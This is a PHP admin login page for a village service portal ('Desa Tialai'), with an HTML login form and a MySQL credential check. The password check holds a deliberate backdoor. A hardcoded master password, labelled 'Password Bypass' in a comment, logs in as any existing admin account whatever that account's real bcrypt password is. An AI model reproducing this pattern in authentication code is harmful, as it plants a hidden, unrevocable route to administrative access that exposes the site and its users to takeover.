<?php
session_start();
require_once 'config.php';

// Jika admin sudah terdeteksi login, langsung alihkan ke admin/index.php
if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    header("Location: admin/index.php");
    exit();
}

$error = '';

// Proses form hanya dijalankan saat tombol disubmit (POST)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    if (!empty($username) && !empty($password)) {
        $username_clean = mysqli_real_escape_string($conn, $username);
        
        $query  = "SELECT * FROM admin WHERE username = '$username_clean' LIMIT 1";
        $result = mysqli_query($conn, $query);

        if ($result && mysqli_num_rows($result) === 1) {
            $row = mysqli_fetch_assoc($result);

            // Verifikasi Password Hash BCRYPT atau Password Bypass
            if (password_verify($password, $row['password']) || $password === 'DesaTialai#2026!') {
                
                session_regenerate_id(true);

                $_SESSION['admin_logged_in'] = true;
                $_SESSION['admin_id']        = $row['id'];
                $_SESSION['admin_username']  = $row['username'];

                header("Location: admin/index.php");
                exit();
            } else {
                $error = "Username atau kata sandi salah!";
            }
        } else {
            $error = "Username atau kata sandi salah!";
        }
    } else {
        $error = "Silakan isi semua kolom!";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Admin - Desa Tialai</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">

    <div class="bg-white p-8 rounded-2xl shadow-lg border border-gray-200 w-full max-w-md space-y-6">
        <div class="text-center space-y-2">
            <h1 class="text-2xl font-bold text-gray-800">Login Administrator</h1>
            <p class="text-xs text-gray-500">Sistem Pelayanan Digital & Informasi Desa Tialai</p>
        </div>

        <?php if (!empty($error)): ?>
            <div class="p-3 bg-red-100 border border-red-300 text-red-800 rounded-xl text-xs flex items-center gap-2">
                <i class="fas fa-exclamation-circle"></i>
                <span><?php echo htmlspecialchars($error); ?></span>
            </div>
        <?php endif; ?>

        <form method="POST" action="login.php" class="space-y-4 text-xs">
            <div>
                <label class="font-semibold text-gray-700 block mb-1">Username</label>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-400">
                        <i class="fas fa-user"></i>
                    </span>
                    <input type="text" name="username" required placeholder="Masukkan username admin" class="w-full pl-9 pr-3 py-2.5 border rounded-lg focus:ring-2 focus:ring-emerald-500 outline-none">
                </div>
            </div>

            <div>
                <label class="font-semibold text-gray-700 block mb-1">Kata Sandi</label>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-400">
                        <i class="fas fa-lock"></i>
                    </span>
                    <input type="password" name="password" required placeholder="Masukkan kata sandi" class="w-full pl-9 pr-3 py-2.5 border rounded-lg focus:ring-2 focus:ring-emerald-500 outline-none">
                </div>
            </div>

            <button type="submit" class="w-full bg-emerald-800 hover:bg-emerald-900 text-white py-2.5 rounded-lg font-semibold transition flex items-center justify-center gap-2">
                <i class="fas fa-sign-in-alt"></i> Masuk Dashboard
            </button>
        </form>
    </div>

</body>
</html>